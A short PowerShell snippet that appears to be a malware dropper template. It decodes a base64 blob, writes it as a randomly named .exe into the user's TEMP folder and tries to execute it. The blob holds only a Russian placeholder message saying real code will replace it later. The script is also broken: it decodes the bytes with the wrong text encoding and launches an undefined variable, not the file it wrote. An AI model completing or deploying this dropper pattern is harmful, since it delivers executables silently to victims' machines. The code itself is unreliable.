$base64 = "0J/RgNC+0YHRgtC+INGC0LXRgdGCLCDQtdGB0LvQuCDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0LfQsNC80LXQvdGOINC90LAg0YDQtdCw0LvRjNC90YvQuSDQutC+0LQK0KPQsdGA0LDQuyDRh9GC0L4t0LHRiyDRgtGLINC90LUg0LTRg9C80LDQuyDQv9C+0Lsg0LPQvtC00LAgOik="
$bytes = [Convert]::FromBase64String($base64)
$text = [System.Text.Encoding]::Unicode.GetString($bytes)
$e = "$env:TEMP\wkfpzmwopynsowntovmsxp.exe"
[IO.File]::WriteAllText($e, $text, [System.Text.Encoding]::Unicode)
Start-Process $exePath
